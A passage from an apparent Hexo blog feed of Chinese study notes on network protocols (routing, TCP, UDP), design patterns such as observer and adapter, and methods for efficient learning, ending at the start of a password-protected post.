<p>解答： IP 协议并不要求源主机重传有差错的 IP 数据报 保证无差错传输是由 TCP 协议完成的。另一方面，首部检验和只能检验出 IP 数据报的首部是否出现差错，但不知道首部中的源地址字段有没有出错。如果源地址出现了差错，那么将这种 IP 数据报传送到错误的地址<br>也是没有任何意义的</p>
<h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>路由分静态路由和动态路由，静态路由可以配置复杂的策略路由，控制转发策略；</p>
</li>
<li><p>动态路由主流算法有两种，距离矢量算法和链路状态算法。基于两种算法产生两种协议，BGP协议和OSPF协议。</p>
</li>
</ul>
<h4 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h4><p>1、距离矢量路由算法，它是基于Bellman-Ford算法的。</p>
<p>这种算法的基本思路是，每个路由器都保存一个路由表，包含多行，每行对应网络中的一个路由器，每一行包含两部分信息，一个是要到目标路由器，从那条线出去，另一个是到目标路由器的距离。</p>
<p>缺点：</p>
<p>第一个问题就是好消息传得快，坏消息传得慢。</p>
<p>第二个问题是，每次发送的时候，要发送整个全局路由表。</p>
<p>2、链路状态路由算法，基于Dijkstra算法。</p>
<p>这种算法的基本思路是：当一个路由器启动的时候，首先是发现邻居，向邻居say hello，邻居都回复。然后计算和邻居的距离，发送一个echo，要求马上返回，除以二就是距离。然后将自己和邻居之间的链路状态包广播出去，发送到整个网络的每个路由器。这样每个路由器都能够收到它和邻居之间的关系的信息。因而，每个路由器都能在自己本地构建一个完整的图，然后针对这个图使用Dijkstra算法，找到两点之间的最短路径。</p>
<h4 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h4><p>1、基于链路状态路由算法的OSPF</p>
<p>OSPF（Open Shortest Path First，开放式最短路径优先）就是这样一个基于链路状态路由协议，广泛应用在数据中心中的协议。由于主要用在数据中心内部，用于路由决策，因而称为内部网关协议（Interior Gateway Protocol，简称IGP）。</p>
<p>内部网关协议的重点就是找到最短的路径。在一个组织内部，路径最短往往最优。当然有时候OSPF可以发现多个最短的路径，可以在这多个路径中进行负载均衡，这常常被称为等价路由。</p>
<p>2、基于距离矢量路由算法的BGP</p>
<p>但是外网的路由协议，也即国家之间的，又有所不同。我们称为外网路由协议（Border Gateway Protocol，简称BGP）。</p>
<p>BGP又分为两类：<br>eBGP和iBGP。<br>自治系统间，边界路由器之间使用eBGP广播路由。内部网络也需要访问其他的自治系统。边界路由器如何将BGP学习到的路由导入到内部网络呢？就是通过运行iBGP，使得内部的路由器能够找到到达外网目的地的最好的边界路由器。</p>
<ul>
<li><p>自治系统</p>
</li>
<li><ul>
<li>Stub AS：对外只有一个连接。这类AS不会传输其他AS的包。例如，个人或者小公司的网络。</li>
</ul>
</li>
<li><ul>
<li>Multihomed AS：可能有多个连接连到其他的AS，但是大多拒绝帮其他的AS传输包。例如一些大公司的网络。</li>
</ul>
</li>
<li><ul>
<li>Transit AS：有多个连接连到其他的AS，并且可以帮助其他的AS传输包。例如主干网。</li>
</ul>
</li>
<li><ul>
<li>每个自治系统都有边界路由器，通过它和外面的世界建立联系。</li>
</ul>
</li>
</ul>
<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>1、路由协议要在路由器之间交换信息，这些信息的交换还需要走路由吗？不是死锁了吗？</p>
<p>解答：</p>
<p>2、路由器之间信息的交换使用什么协议呢？报文格式是什么样呢？</p>
<p>解答：</p>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h2><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h2 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h2><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul>
<li><ul>
<li>TCP包头很复杂，但是主要关注五个问题，顺序问题，丢包问题，连接维护，流量控制，拥塞控制；</li>
</ul>
</li>
<li><ul>
<li>连接的建立是经过三次握手，断开的时候四次挥手，一定要掌握的我画的那个状态图。</li>
</ul>
</li>
<li><ul>
<li>顺序问题、丢包问题、流量控制都是通过滑动窗口来解决的，这其实就相当于你领导和你的工作备忘录，布置过的工作要有编号，干完了有反馈，活不能派太多，也不能太少；</li>
</ul>
</li>
<li><ul>
<li>拥塞控制是通过拥塞窗口来解决的，相当于往管道里面倒水，快了容易溢出，慢了浪费带宽，要摸着石头过河，找到最优值。</li>
</ul>
</li>
<li><ul>
<li>TCP包头格式</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-21c585cc5cfd7ff5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="TCP包头格式"></p>
<ul>
<li><ul>
<li>TCP状态机</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-679abd006ba3beff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="TCP状态机"></p>
<ul>
<li><ul>
<li>三次握手状态时序图</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-a1b187bcab936f25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="三次握手状态时序图"></p>
<ul>
<li><ul>
<li>四次挥手状态时序图</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-e0aa2b42655e1166.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="四次挥手状态时序图"></p>
<h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><ul>
<li><p>TCP的连接有这么多的状态，你知道如何在系统中查看某个连接的状态吗？</p>
</li>
<li><p>这一节仅仅讲了连接维护问题，其实为了维护连接的状态，还有其他的数据结构来处理其他的四个问题，那你知道是什么吗？</p>
</li>
<li><p>TCP的BBR听起来很牛，你知道他是如何达到这个最优点的嘛？</p>
</li>
</ul>
<p>答：<br>S1：慢启动开始时，以前期的延迟时间为延迟最小值Tmin。然后监控延迟值是否达到Tmin的n倍，达到这个阀值后，判断带宽已经消耗尽且使用了一定的缓存，进入排空阶段。<br>S2：指数降低发送速率，直至延迟不再降低。这个过程的原理同S1<br>S3：协议进入稳定运行状态。交替探测带宽和延迟，且大多数时间下都处于带宽探测阶段。</p>
<ul>
<li>学会了UDP和TCP，你知道如何基于这两种协议写程序吗？这样的程序会有什么坑呢？</li>
</ul>
<h3 id="TCP-IP协议与Http协议的区别"><a href="#TCP-IP协议与Http协议的区别" class="headerlink" title="TCP/IP协议与Http协议的区别"></a>TCP/IP协议与Http协议的区别</h3><p><a href="https://www.cnblogs.com/xianlei/p/tcpip_http.html" target="_blank" rel="noopener">参考博客</a></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200325/FThdG8V37qoc.png" alt="mark"></p>
<h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ul>
<li><ul>
<li>如果将TCP比作成熟的社会人，UDP则是头脑简单的小朋友。TCP复杂，UDP简单；TCP维护连接，UDP谁都相信；TCP会坚持知进退；UDP愣头青一个，勇往直前；</li>
</ul>
</li>
<li><ul>
<li>UDP虽然简单，但它有简单的用法。它可以用在环境简单、需要多播、应用层自己控制传输的地方。例如DHCP、VXLAN、QUIC等。</li>
</ul>
</li>
<li><ul>
<li>UDP包头</li>
</ul>
</li>
</ul>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-795cafa4216f85df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="UDP包头"></p>
<h3 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h3><ul>
<li><p>都说TCP是面向连接的，在计算机看来，怎么样才算一个连接呢？</p>
</li>
<li><p>你知道TCP的连接是如何建立，又是如何关闭的吗？</p>
</li>
</ul>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式学习计划</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="计划："><a href="#计划：" class="headerlink" title="计划："></a>计划：</h2><p>每天 19：00 - 20：00 时间段内花费 30 min - 40 min 学习一个设计模式。</p>
<p>一个月完成。</p>
<p>学习内容：</p>
<p><a href="https://gitbook.cn/gitchat/column/5b26040ac81ac568fcf64ea3" target="_blank" rel="noopener">gitchat 白话设计模式 28 讲</a><br><a id="more"></a></p>
<h2 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title="什么是设计模式"></a>什么是设计模式</h2><p>设计模式（Design Pattern）是一套被反复使用、多数人知晓的、无数工程师实践的代码设计经验的总结，它是面向对象思想的高度提炼和模板化，使用设计模式是为了让代码具有更高的可重用性，更好的灵活性和可拓展性，更易被人阅读和理解。</p>
<h2 id="学习设计模式的先行条件"><a href="#学习设计模式的先行条件" class="headerlink" title="学习设计模式的先行条件"></a>学习设计模式的先行条件</h2><p>熟悉一门面向对象语言、学会阅读 UML 图</p>
<p><a href="http://www.uml.org.cn/oobject/201210081.asp" target="_blank" rel="noopener">UML 类图关系大全</a><br><a href="http://www.cnblogs.com/olvo/archive/2012/05/03/2481014.html" target="_blank" rel="noopener">UML 类图关系（泛化 、继承、实现、依赖、关联、聚合、组合）</a></p>
<h2 id="监听模式-观察者模式"><a href="#监听模式-观察者模式" class="headerlink" title="监听模式/观察者模式"></a>监听模式/观察者模式</h2><p>观察者模式是对象的行为模式，又叫发布 - 订阅（Publish/Subscribe）模式、模型 - 视图（Model/View）模式、源 - 监听器（Source/Listener）模式或从属者（Dependents）模式。当你看这些模式的时候，不要觉得陌生，它们就是观察者模式。</p>
<p>观察者模式一般是一种一对多的关系，可以有任意个（一个或多个）观察者对象同时监听某一个对象。监听的对象叫观察者（后面提到监听者，其实就指观察者，两者是等价的），被监听的对象叫被观察者（Observable，也叫主题 Subject）。被观察者对象在状态或内容发生变化时，会通知所有观察者对象，使它们能够做出相应的变化（如自动更新自己的信息）。</p>
<h2 id="模型抽象"><a href="#模型抽象" class="headerlink" title="模型抽象"></a>模型抽象</h2><h3 id="思考类图设计"><a href="#思考类图设计" class="headerlink" title="思考类图设计"></a>思考类图设计</h3><h2 id="模型说明"><a href="#模型说明" class="headerlink" title="模型说明"></a>模型说明</h2><h3 id="设计要点"><a href="#设计要点" class="headerlink" title="设计要点"></a>设计要点</h3><p>在设计观察者模式的程序时要注意以下几点：</p>
<p>要明确谁是观察者谁是被观察者，只要明白谁是关注对象，问题也就明白了。一般观察者与被观察者之间是多对一的关系，一个被观察对象可以有多个监听对象 (观察者)。如一个编辑框，有鼠标点击的监听者，也有键盘的监听者，还有内容改变的监听者。</p>
<p>Observable 在发送广播通知的时候，无须指定具体的 Observer，Observer 可以自己决定是否要订阅 Subject 的通知。</p>
<p>被观察者至少需要有三个方法：添加监听者、移除监听者、通知 Observer 的方法；观察者至少要有一个方法：更新方法，更新当前的内容，作出相应的处理。</p>
<p>添加监听者、移除监听者在不同的模型称谓中可能会有不同命名，如观察者模型中一般，addObserver，removeObserver；在源 - 监听器（Source/Listener）模型中一般是 attach/detach，应用在桌面编程的窗口中，还可能是 attachWindow/detachWindow，或 Register/UnRegister。不要被名称迷糊了，不管他们是什么名称，其实功能都是一样的，就是添加 / 删除观察者。</p>
<h3 id="推模型和拉模型"><a href="#推模型和拉模型" class="headerlink" title="推模型和拉模型"></a>推模型和拉模型</h3><p>观察者模式根据其侧重的功能还可以分为推模型和拉模型。</p>
<p>推模型：</p>
<p>被观察者对象向观察者推送主题的详细信息，不管观察者是否需要，推送的信息通常是主题对象的全部或部分数据。一般这种模型的实现中，会把被观察者对象中的全部或部分信息通过 update 的参数传递给观察者 [update (Object obj) ，通过 obj 参数传递]。</p>
<p>拉模型：</p>
<p>被观察者在通知观察者的时候，只传递少量信息。如果观察者需要更具体的信息，由观察者主动到被观察者对象中获取，相当于是观察者从被观察者对象中拉数据。一般这种模型的实现中，会把被观察者对象自身通过 update 方法传递给观察者 [update (Observable observable)，通过 observable 参数传递 ]，这样在观察者需要获取数据的时候，就可以通过这个引用来获取了。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1、对一个对象状态或数据的更新需要其他对象同步更新，或者一个对象的更新需要依赖另一个对象的更新；</p>
<p>2、对象仅需要将自己的更新通知给其他对象而不需要知道其他对象的细节，如消息推送。</p>
<h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h3 id="模型抽象-1"><a href="#模型抽象-1" class="headerlink" title="模型抽象"></a>模型抽象</h3><h4 id="思考类图设计-1"><a href="#思考类图设计-1" class="headerlink" title="思考类图设计"></a>思考类图设计</h4><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>接口转换，将原有的接口（或方法）转换成另一种接口；<br>用新的接口包装一个已有的类；<br>匹配一个老的组件到一个新的接口。</p>
<h3 id="设计要点-1"><a href="#设计要点-1" class="headerlink" title="设计要点"></a>设计要点</h3><h4 id="思考设计类图"><a href="#思考设计类图" class="headerlink" title="思考设计类图"></a>思考设计类图</h4><p>适配器模式中主要三个角色，在设计适配器模式时要找到并区分这些角色：</p>
<p>目标（Target）： 即你期望的目标接口，要转换成的接口。<br>源对象（Adaptee）： 即要被转换的角色，要把谁转换成目标角色。<br>适配器（Adapter）： 适配器模式的核心角色，负责把源对象转换和包装成目标对象。</p>
<h3 id="模型说明-1"><a href="#模型说明-1" class="headerlink" title="模型说明"></a>模型说明</h3><h4 id="设计要点-2"><a href="#设计要点-2" class="headerlink" title="设计要点"></a>设计要点</h4><p>适配器模式中主要三个角色，在设计适配器模式时要找到并区分这些角色：</p>
<ul>
<li><p>目标（Target）：<br>即你期望的目标接口，要转换成的接口。</p>
</li>
<li><p>源对象（Adaptee）：<br>即要被转换的角色，要把谁转换成目标角色。</p>
</li>
<li><p>适配器（Adapter）：<br>适配器模式的核心角色，负责把源对象转换和包装成目标对象</p>
</li>
</ul>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><ul>
<li>适配器模式的优点</li>
</ul>
<p>可以让两个没有关联的类一起运行，起着中间转换的作用。<br>提高了类的复用。<br>灵活性好，不会破坏原有的系统。</p>
<ul>
<li>适配器模式的缺点</li>
</ul>
<p>如果原有系统没有设计好（如 Target 不是抽象类或接口，而一个实体类），适配器模式将很难实现。<br>过多地使用适配器，容易使代码结构混乱，如明明看到调用的是 A 接口，内部调用的却是 B 接口的实现。</p>
<h3 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h3><p>1、系统需要使用现有的类，而这些类的接口不符合现有系统的要求。</p>
<p>2、对已有的系统拓展新功能时，尤其适用于在设计良好的系统框架下增加接入第三方的接口或第三方的 SDK 时。</p>
<h2 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h2><h3 id="模型抽象-2"><a href="#模型抽象-2" class="headerlink" title="模型抽象"></a>模型抽象</h3><h4 id="思考代码框架与类图"><a href="#思考代码框架与类图" class="headerlink" title="思考代码框架与类图"></a>思考代码框架与类图</h4><h3 id="模型说明-2"><a href="#模型说明-2" class="headerlink" title="模型说明"></a>模型说明</h3><p>1、在状态模式实现的时候，实现的场景状态有时候会非常复杂。决定状态变化的因素也会非常多，这个时候我们可以把决定状态变化的属性单独抽象成一个类 StateInfo，这样判断状态属性是否符合当前的状态 isMatch 时就可以传入更多的信息。</p>
<p>2、每一种状态应当只有唯一的一个实例。</p>
<h3 id="应用场景-2"><a href="#应用场景-2" class="headerlink" title="应用场景"></a>应用场景</h3><p>1、一个对象的行为取决于它的状态，并且它在运行时可能经常改变它的状态从而改变它的行为。</p>
<p>2、一个操作中含有庞大的多分支的条件语句，且这些分支依赖于该对象的状态，且每一个分支的业务逻辑非常复杂时，我们可以使用状态模式来拆分他不同分支逻辑，使程序有更好的可读性可维护性。</p>
<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><h3 id="模型抽象-3"><a href="#模型抽象-3" class="headerlink" title="模型抽象"></a>模型抽象</h3><h4 id="代码框架"><a href="#代码框架" class="headerlink" title="代码框架"></a>代码框架</h4><p>1.重写new和init方法<br>2.自定义metaclass的方法<br>3.装饰器的方法</p>
<h4 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h4><h4 id="基于框架的实现"><a href="#基于框架的实现" class="headerlink" title="基于框架的实现"></a>基于框架的实现</h4><h3 id="应用场景-3"><a href="#应用场景-3" class="headerlink" title="应用场景"></a>应用场景</h3><p>1、你希望这个类只有一个且只能有一个实例；</p>
<p>2、项目中的一些全局管理类（Manager）可以用单例来实现。</p>
<h2 id="职责模式"><a href="#职责模式" class="headerlink" title="职责模式"></a>职责模式</h2><h3 id="模型抽象-4"><a href="#模型抽象-4" class="headerlink" title="模型抽象"></a>模型抽象</h3><h4 id="代码框架-1"><a href="#代码框架-1" class="headerlink" title="代码框架"></a>代码框架</h4><h4 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h4><h4 id="基于框架的实现-1"><a href="#基于框架的实现-1" class="headerlink" title="基于框架的实现"></a>基于框架的实现</h4><h3 id="模型说明-3"><a href="#模型说明-3" class="headerlink" title="模型说明"></a>模型说明</h3><h4 id="设计要点-3"><a href="#设计要点-3" class="headerlink" title="设计要点"></a>设计要点</h4><p>在设计职责模式的程序时要注意以下几点：</p>
<p>请求者与请求内容：谁要发送请求？发送请求的对象称为请求者。请求的内容通过发送请求时的参数进行传递。</p>
<p>有哪些责任人：责任人是构成责任链的关键要素。请求的流动方向是链条中的线，而责任人则是链条上的结点，线和结点才构成了一条链条。</p>
<p>对责任人进行抽象：真实世界中的责任人会多种多样，纷繁复杂，会有不同的职责和功能；但他们也有一个共同的特征——都可以处理请求。所以需要对责任人进行抽象，使他们具有责任的可传递性。</p>
<p>责任人可自由组合：责任链上的责任人可以根据业务的具体逻辑进行自由的组合和排序。</p>
<h4 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h4><ul>
<li>优点：</li>
</ul>
<p>降低耦合度。它将请求的发送者和接受者解耦。<br>简化了对象。使得对象不需要知道链的结构。<br>增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任人。<br>增加新的处理类很方便。</p>
<ul>
<li>缺点：</li>
</ul>
<p>不能保证请求一定被接收。<br>系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。</p>
<h3 id="应用场景-4"><a href="#应用场景-4" class="headerlink" title="应用场景"></a>应用场景</h3><p>有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。<br>请求的处理具有明显的一层层传递关系。<br>请求的处理流程和顺序需要程序运行时动态确定。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>高效学习之反思</title>
    <url>/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>大部分人都认为自己爱学习，但是：</p>
<ul>
<li>他们都是只有意识没有行动，他们是动力不足的人。</li>
<li>他们都不知道自己该学什么，他们缺乏方向和目标。</li>
<li>他们都不具备自主学习的能力，没有正确的方法和技能。</li>
<li>更要命的是，他们缺乏实践和坚持。</li>
</ul>
<p>挑选知识和信息源！<br>注重基础知识和原理上的学习！<br>使用知识图—联想！<br><a id="more"></a></p>
<h4 id="主动学习和被动学习"><a href="#主动学习和被动学习" class="headerlink" title="主动学习和被动学习"></a>主动学习和被动学习</h4><p>人的学习分为「被动学习」和「主动学习」两个层次。</p>
<ul>
<li><p>被动学习：如听讲、阅读、试听、演示，学习内容的平均留存率为 5%、10%、20% 和 30%。</p>
</li>
<li><p>主动学习：如通过讨论、实践、教授给他人，会将原来被动学习的内容留存率从 5% 提升到 50%、75% 和 90%。</p>
</li>
</ul>
<h4 id="浅度学习和深度学习"><a href="#浅度学习和深度学习" class="headerlink" title="浅度学习和深度学习"></a>浅度学习和深度学习</h4><ul>
<li>这些所谓的“快餐文化”可以让你有短暂的满足感，但是无法让你有更深层次的思考和把知识转换成自己的技能的有效路径，因为那些都是需要大量时间和精力的付出，不符合现代人的生活节奏。人们开始在朋友圈、公众号、得到等这样的地方进行学习，导致他们越学越焦虑，越学越浮燥，越学越不会思考。于是，他们成了“什么都懂，但依然过不好这一生”的状态。</li>
</ul>
<h5 id="怎样进行深度学习"><a href="#怎样进行深度学习" class="headerlink" title="怎样进行深度学习"></a>怎样进行深度学习</h5><ul>
<li>高质量的信息源和第一手的知识。</li>
<li>把知识连成地图，将自己的理解反述出来。</li>
<li>不断地反思和思辨，与不同年龄段的人讨论。</li>
<li>举一反三，并践行之，把知识转换成技能<h5 id="学习有三个步骤"><a href="#学习有三个步骤" class="headerlink" title="学习有三个步骤"></a>学习有三个步骤</h5></li>
<li><p>知识采集。信息源是非常重要的，获取信息源头、破解表面信息的内在本质、多方数据印证，是这个步骤的关键。</p>
</li>
<li><p>知识缝合。所谓缝合就是把信息组织起来，成为结构体的知识。这里，连接记忆，逻辑推理，知识梳理是很重要的三部分。</p>
</li>
<li><p>技能转换。通过举一反三、实践和练习，以及传授教导，把知识转化成自己的技能。这种技能可以让你进入更高的阶层。</p>
</li>
</ul>
<h4 id="系统地学习—-学习模板"><a href="#系统地学习—-学习模板" class="headerlink" title="系统地学习—-学习模板"></a>系统地学习—-学习模板</h4><p>1、这个技术出现的背景、初衷和要达到什么样的目标或是要解决什么样的问题。这个问题非常关键，也就是说，你在学习一个技术的时候，需要知道这个技术的成因和目标，也就是这个技术的灵魂。如果不知道这些的话，那么你会看不懂这个技术的一些设计理念。</p>
<p>2、这个技术的优势和劣势分别是什么，或者说，这个技术的 trade-off 是什么。任何技术都有其好坏，在解决一个问题的时候，也会带来新的问题。另外，一般来说，任何设计都有 trade-off（要什么和不要什么），所以，你要清楚这个技术的优势和劣势，以及带来的挑战。</p>
<p>3、这个技术适用的场景。任何技术都有其适用的场景，离开了这个场景，这个技术可能会有很多槽点，所以学习技术不但要知道这个技术是什么，还要知道其适用的场景。没有任何一个技术是普适的。注意，所谓场景一般分别两个，一个是业务场景，一个是技术场景。</p>
<p>4、技术的组成部分和关键点。这是技术的核心思想和核心组件了，也是这个技术的灵魂所在了。学习技术的核心部分是快速掌握的关键。</p>
<p>5、技术的底层原理和关键实现。任何一个技术都有其底层的关键基础技术，这些关键技术很有可能也是其它技术的关键基础技术。所以，学习这些关键的基础底层技术，可以让你未来很快地掌握其它技术。可以参看我在 CoolShell 上写的 Docker 底层技术那一系列文章。</p>
<p>6、已有的实现和它之间的对比。一般来说，任何一个技术都会有不同的实现，不同的实现都会有不同的侧重。学习不同的实现，可以让你得到不同的想法和思路，对于开阔思维，深入细节是非常重要的。</p>
<h4 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h4><h4 id="总结和归纳"><a href="#总结和归纳" class="headerlink" title="总结和归纳"></a>总结和归纳</h4><ul>
<li>学习的开始阶段，可以不急于总结归纳，不急于下判断，做结论，而应该保留部分知识的不确定性，保持对知识的开放状态。</li>
<li><p>当对整个知识的理解更深入，自己站的位置更高以后，总结和归纳才会更有条理。</p>
</li>
<li><p><strong>总结一下做总结归纳的方法</strong>：把你看到和学习到的信息，归整好，排列好，关联好，总之把信息碎片给结构化掉，然后在结构化的信息中，找到规律，找到相通之处，找到共同之处，进行简化、归纳和总结，最终形成一种套路，一种模式，一种通用方法</p>
</li>
<li><p>训练自己这方面的能力，需要多看一些经典的方法论图书</p>
<h4 id="实践出真知"><a href="#实践出真知" class="headerlink" title="实践出真知"></a>实践出真知</h4><p>《Effective C++》和《More Effective C++》<br>左耳朵大叔看了十多年，书中的很多章节我都可以背出来，但是我想得到的不是这些知识，而是这种思维方式，这需要我去做很多的编程工作才能真正明白，才会有斯科特·迈耶斯（Scott Meyers）那样的思维方式，这才是最宝贵的。</p>
<h4 id="坚持不懈"><a href="#坚持不懈" class="headerlink" title="坚持不懈"></a>坚持不懈</h4><p>ARTS 的活动：每人每周写一个 ARTS：Algorithm 是一道算法题，Review 是读一篇英文文章，Technique/Tips 是分享一个小技术，Share 是分享一个观点。我希望大家可以坚持一年，但是我也相信，能够坚持下来的人一定很少，绝大多数人都是虎头蛇尾的，但是我依然相信会有人坚持下来的。</p>
</li>
</ul>
<p>坚持也不是要苦苦地坚持，有循环有成就感的坚持才是真正可以持续的。所以，一方面你要把你的坚持形成成果晒出来，让别人来给你点赞，另一方面，你还要把坚持变成一种习惯，就像吃饭喝水一样，你感觉不到太多的成本付出。只有做到这两点，你才能够真正坚持。</p>
<h4 id="软件的代码是由哪些部分构成的"><a href="#软件的代码是由哪些部分构成的" class="headerlink" title="软件的代码是由哪些部分构成的"></a>软件的代码是由哪些部分构成的</h4><p>eg:</p>
<ul>
<li><p>接口抽象定义。任何代码都会有很多接口或抽象定义，其描述了代码需要处理的数据结构或者业务实体，以及它们之间的关系，理清楚这些关系是非常重要的。</p>
</li>
<li><p>模块粘合层。我们的代码有很多都是用来粘合代码的，比如中间件（middleware）、Promises 模式、回调（Callback）、代理委托、依赖注入等。这些代码模块间的粘合技术是非常重要的，因为它们会把本来平铺直述的代码给分裂开来，让你不容易看明白它们的关系。</p>
</li>
<li><p>业务流程。这是代码运行的过程。一开始，我们不要进入细节，但需要在高层搞清楚整个业务的流程是什么样的，在这个流程中，数据是怎么被传递和处理的。一般来说，我们需要画程序流程图或者时序处理图。</p>
</li>
<li><p>具体实现。了解上述的三个方面的内容，相信你对整个代码的框架和逻辑已经有了总体认识。这个时候，你就可以深入细节，开始阅读具体实现的代码了。对于代码的具体实现，一般来说，你需要知道下面一些事实，这样有助于你在阅读代码时找到重点。</p>
</li>
<li><ul>
<li>代码逻辑。代码有两种逻辑，一种是业务逻辑，这种逻辑是真正的业务处理逻辑；另一种是控制逻辑，这种逻辑只是用控制程序流转的，不是业务逻辑。比如：flag 之类的控制变量，多线程处理的代码，异步控制的代码，远程通讯的代码，对象序列化反序列化的代码等。这两种逻辑你要分开，很多代码之所以混乱就是把这两种逻辑混在一起了（详情参看《编程范式游记》）。</li>
</ul>
</li>
<li><ul>
<li>出错处理。根据 2：8 原则，20% 的代码是正常的逻辑，80% 的代码是在处理各种错误，所以，你在读代码的时候，完全可以把处理错误的代码全部删除掉，这样就会留下比较干净和简单的正常逻辑的代码。排除干扰因素，可以更高效地读代码。</li>
</ul>
</li>
<li><ul>
<li>数据处理。只要你认真观察，就会发现，我们好多代码就是在那里倒腾数据。比如 DAO、DTO，比如 JSON、XML，这些代码冗长无聊，不是主要逻辑，可以不理。</li>
</ul>
</li>
<li><ul>
<li>重要的算法。一般来说，我们的代码里会有很多重要的算法，我说的并不一定是什么排序或是搜索算法，可能会是一些其它的核心算法，比如一些索引表的算法，全局唯一 ID 的算法，信息推荐的算法、统计算法、通读算法（如 Gossip）等。这些比较核心的算法可能会非常难读，但它们往往是最有技术含量的部分。</li>
</ul>
</li>
<li><ul>
<li>底层交互。有一些代码是和底层系统的交互，一般来说是和操作系统或是 JVM 的交互。因此，读这些代码通常需要一定的底层技术知识，不然，很难读懂。</li>
</ul>
</li>
<li><p>运行时调试。很多时候，代码只有运行起来了，才能知道具体发生了什么事，所以，我们让代码运行进来，然后用日志也好，debug 设置断点跟踪也好。实际看一下代码的运行过程，是了解代码的一种很好的方式。</p>
</li>
</ul>
<h4 id="阅读代码的方法"><a href="#阅读代码的方法" class="headerlink" title="阅读代码的方法"></a>阅读代码的方法</h4><ul>
<li>一般采用自顶向下，从总体到细节的“剥洋葱皮”的读法。</li>
<li>画图是必要的，程序流程图，调用时序图，模块组织图。</li>
<li>代码逻辑归一下类，排除杂音，主要逻辑才会更清楚。</li>
<li>debug 跟踪一下代码是了解代码在执行中发生了什么的最好方式。</li>
</ul>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>学习的三种阶段：入门、掌握、精通。</p>
<p>入门篇 – 读文章 对这个知识有一定的了解，了解大概的发展趋势以及使用复杂程- 度，达到基本可以使用程度。</p>
<p>掌握篇 – 看网上的教程 对这个知识使用并了解一些出现bug解决方案，扩展使用途径。</p>
<p>精通篇 – 对知识体系结构已有完整认知 需要读别人写的书 加上自己亲自打代码时间 完全了解这个知识发展渊源。</p>
]]></content>
      <categories>
        <category>高效学习</category>
      </categories>
      <tags>
        <tag>高效学习</tag>
        <tag>左耳朵大叔</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-linux-文章收集</title>
    <url>/2019-linux-%E6%96%87%E7%AB%A0%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." 